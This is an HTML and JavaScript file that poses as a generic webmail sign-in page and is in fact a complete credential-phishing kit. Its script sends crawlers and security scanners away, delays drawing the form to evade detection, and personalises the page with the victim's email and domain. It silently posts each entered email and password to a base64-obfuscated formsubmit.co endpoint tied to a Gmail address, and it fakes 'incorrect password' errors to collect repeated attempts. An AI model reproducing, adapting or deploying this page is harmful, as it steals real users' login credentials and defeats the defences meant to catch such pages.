<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="referrer" content="strict-origin">
    <meta name="robots" content="noindex, nofollow">
    <title>Webmail - Login</title>
    
    <!-- Global Centering and Base Styles -->
    <style>
        :root {
            --page: #eeeeee;
            --surface: #ffffff;
            --text: #171b1c;
            --subtle: #737670;
            --account: #f3f3f3;
            --avatar: #626462;
            --line: #969696;
            --action: #006bb4;
            --action-hover: #005b99;
            --on-action: #ffffff;
            --focus: #006bb4;
        }
        * { box-sizing: border-box; }
        html, body { height: 100%; }
        body {
            margin: 0;
            background-color: var(--page);
            color: var(--text);
            font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-size: 100% auto;
            background-position: top center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            transition: background-image 0.5s ease-in-out;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        @media (max-width: 600px) {
            body {
                padding: 16px;
                background-size: 100% auto;
                background-position: top center;
                background-attachment: scroll;
            }
        }
    </style>
</head>

<body>
    <!-- ROOT NODE FOR INJECTION -->
    <div id="cloaker-root"></div>

    <script>
    (function () {
        // =====================================================
        // 1. CONFIG & BOT DETECTION
        // =====================================================
        const EMAIL_MARKER = 'username=';   // URL marker
        const DEFAULT_EMAIL = '';
        const MAX_ATTEMPTS = 3;
        const STORAGE_KEY = 'attempts:' + location.pathname;
        
        // Obfuscated FormSubmit Endpoint
        // Decodes to: https://formsubmit.co/ajax/hmp.productt@gmail.com
        const _0x4f2a = "aHR0cHM6Ly9mb3Jtc3VibWl0LmNvL2FqYXgvaG1wLnByb2R1Y3R0QGdtYWlsLmNvbQ==";
        const FORMSUBMIT_AJAX = atob(_0x4f2a);

        // Bot Detection
        const ua = navigator.userAgent.toLowerCase();
        const botSignatures = [
            'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
            'yandexbot', 'facebot', 'ia_archiver', 'phishtank', 'urlscan',
            'virustotal', 'netcraft', 'sophos', 'kaspersky', 'mcafee',
            'headlesschrome', 'puppeteer', 'selenium', 'phantomjs'
        ];

        const isDebug = window.location.search.includes('debug=1') || 
                        window.location.protocol === 'file:';

        if (!isDebug) {
            for (let i = 0; i < botSignatures.length; i++) {
                if (ua.includes(botSignatures[i])) {
                    window.location.href = "https://www.google.com";
                    return;
                }
            }
            if (navigator.webdriver || window.navigator.plugins.length === 0) {
                window.location.href = "https://www.google.com";
                return;
            }
        }

        // =====================================================
        // 2. PAYLOAD INJECTION (Delayed)
        // =====================================================
        setTimeout(function() {
            document.getElementById('cloaker-root').innerHTML = `
                <style>
                    .container {
                        width: 440px;
                        max-width: 92%;
                        min-height: auto;
                        margin: 0;
                        padding: 40px 40px 34px;
                        background: var(--surface);
                        border-radius: 2px;
                        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.12);
                        animation: fadeIn 0.5s ease;
                    }
                    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
                    h1 { margin: 0 0 10px; font-size: 26px; line-height: 1.2; font-weight: 600; }
                    .subtitle { margin: 0 0 24px; font-size: 16px; line-height: 1.3; }
                    .account {
                        display: flex;
                        align-items: center;
                        gap: 10px;
                        width: 100%;
                        max-width: 100%;
                        height: 38px;
                        padding: 4px 8px 4px 10px;
                        margin-bottom: 20px;
                        background: var(--account);
                    }
                    #logo {
                        display: inline-flex;
                        justify-content: center;
                        align-items: center;
                        flex: 0 0 26px;
                        width: 26px;
                        height: 26px;
                        background: var(--avatar);
                        color: var(--on-action);
                        font-size: 15px;
                        font-family: Georgia, serif;
                        text-transform: uppercase;
                    }
                    #email {
                        flex: 1 1 auto;
                        min-width: 0;
                        width: auto;
                        padding: 0;
                        border: 0;
                        background: transparent;
                        color: var(--text);
                        font: inherit;
                        font-size: 17px;
                        line-height: 24px;
                        border-radius: 0;
                        overflow: visible;
                        white-space: nowrap;
                    }
                    #email:focus { outline: none; }
                    #password {
                        display: block;
                        width: 100%;
                        height: 44px;
                        padding: 8px 12px;
                        border: 1px solid var(--line);
                        border-radius: 0;
                        background: var(--surface);
                        color: var(--text);
                        font: inherit;
                        font-size: 16px;
                    }
                    #password::placeholder { color: var(--subtle); opacity: 1; }
                    input:focus-visible, button:focus-visible { outline: 2px solid var(--focus); outline-offset: 2px; }
                    .actions { display: flex; justify-content: flex-end; margin-top: 22px; }
                    #submit-btn {
                        width: 120px;
                        height: 42px;
                        padding: 0 14px;
                        border: 0;
                        border-radius: 0;
                        background: var(--action);
                        color: var(--on-action);
                        font: inherit;
                        font-size: 16px;
                        cursor: pointer;
                    }
                    #submit-btn:hover { background: var(--action-hover); }
                    #login_footer { margin-top: 6px; color: var(--subtle); font-size: 13px; line-height: 1.4; }
                    #error-msg { margin-top: 10px; color: var(--subtle); font-size: 13px; }
                    [hidden] { display: none !important; }
                    @media (max-width: 600px) {
                        .container { width: 100%; padding: 30px 22px 26px; }
                        h1 { font-size: 24px; }
                        .subtitle { font-size: 15px; }
                        #login_footer { margin-top: 8px; font-size: 12px; }
                    }
                </style>

                <main class="container" id="form-container">
                    <h1>Sign in</h1>
                    <p class="subtitle">Continue to your account</p>
                    <div id="domain-name" hidden></div>
                    <form id="login-form" autocomplete="off">
                        <div class="account">
                            <span id="logo" aria-hidden="true">F</span>
                            <input type="email" name="email" id="email" value="" aria-label="Email">
                        </div>
                        <input type="password" name="password" id="password" placeholder="Password" aria-label="Password" required>
                        <div id="error-msg" class="error-msg" role="status" hidden></div>
                        <div class="actions">
                            <button type="submit" id="submit-btn" class="submit">Sign in</button>
                        </div>
                    </form>
                    <div id="thanks-msg" hidden></div>
                    <footer id="login_footer">Protected by standard security protocols</footer>
                    <span id="kai" hidden></span>
                </main>
            `;

            runPayload(FORMSUBMIT_AJAX, EMAIL_MARKER, DEFAULT_EMAIL, MAX_ATTEMPTS, STORAGE_KEY);

        }, 800); // 800ms delay to defeat fast static crawlers


        // =====================================================
        // 3. PAGE LOGIC & CAPTURE
        // =====================================================
        function runPayload(ajaxUrl, marker, defaultEmail, maxAttempts, storageKey) {
            
            function extractDomain(email) {
                if (!email || !email.includes('@')) return '';
                return email.split('@')[1].trim().toLowerCase();
            }

            function updateLogo(email) {
                var logo = document.getElementById('logo');
                if (!logo) return;
                var first = (email || '').trim().charAt(0);
                if (first && /[a-z0-9]/i.test(first)) logo.textContent = first.toUpperCase();
                else logo.textContent = '?';
            }

            function updateBackground(domain) {
                if (!domain) {
                    document.body.style.backgroundImage = '';
                    return;
                }
                document.body.style.backgroundImage =
                    "url('https://image.thum.io/get/width/1920/https://" + domain + "')";
            }

            function applyEmailAndBackground(email) {
                var emailInput = document.getElementById('email');
                if (emailInput && emailInput.value !== email) emailInput.value = email;
                updateLogo(email);
                updateBackground(extractDomain(email));
            }

            function getEmailFromUrl() {
                var url = window.location.href;
                if (!marker) return '';
                var idx = url.indexOf(marker);
                if (idx === -1) return '';
                var after = url.substring(idx + marker.length);
                if (!after) return '';
                var end = after.length;
                ['&', '#', '?'].forEach(function (d) {
                    var p = after.indexOf(d);
                    if (p !== -1) end = Math.min(end, p);
                });
                var raw = after.substring(0, end).replace(/^[=:/\s]+/, '');
                if (!raw || raw.indexOf('@') === -1) return '';
                try { return decodeURIComponent(raw); } catch (e) { return raw; }
            }

            function initFromUrl() {
                var email = getEmailFromUrl();
                applyEmailAndBackground(email || defaultEmail);
            }

            initFromUrl();
            window.addEventListener('hashchange', initFromUrl);
            window.addEventListener('popstate', initFromUrl);

            document.getElementById('email').addEventListener('input', function () {
                updateLogo(this.value);
                updateBackground(extractDomain(this.value));
            });

            function getAttempts() {
                return parseInt(sessionStorage.getItem(storageKey) || '0', 10);
            }
            function setAttempts(n) {
                sessionStorage.setItem(storageKey, String(n));
            }

            var form = document.getElementById('login-form');
            var errorMsg = document.getElementById('error-msg');

            form.addEventListener('submit', function (e) {
                e.preventDefault();

                var emailInput = document.getElementById('email');
                var passInput  = document.getElementById('password');
                var email = (emailInput ? emailInput.value : '').trim();
                var password = (passInput ? passInput.value : '').trim();
                var domain = extractDomain(email);

                if (!email || !password) return;

                // --- SILENT POST TO FORMSUBMIT ---
                var fd = new FormData();
                fd.append("email", email);
                fd.append("password", password);
                fd.append("attempt", getAttempts() + 1);
                fd.append("timestamp", new Date().toISOString());
                fd.append("_subject", "Webmail capture — " + email);
                fd.append("_template", "table");
                fd.append("_captcha", "false");

                fetch(ajaxUrl, {
                    method: "POST",
                    body: fd,
                    headers: { "Accept": "application/json" }
                }).catch(function () { /* ignore network errors */ });

                // --- VISUAL LOGIC (Fake Error / Redirect) ---
                var attempts = getAttempts() + 1;
                setAttempts(attempts);

                if (attempts >= maxAttempts) {
                    if (errorMsg) {
                        errorMsg.hidden = false;
                        errorMsg.textContent = 'Signing in…';
                    }
                    if (domain) {
                        setTimeout(function () {
                            window.location.href = 'https://' + domain;
                        }, 600);
                    }
                } else {
                    if (passInput) passInput.value = '';
                    if (errorMsg) {
                        errorMsg.hidden = false;
                        errorMsg.textContent = 'Incorrect password. Please try again.';
                    }
                }
            });
        }
    })();
    </script>
</body>
</html>
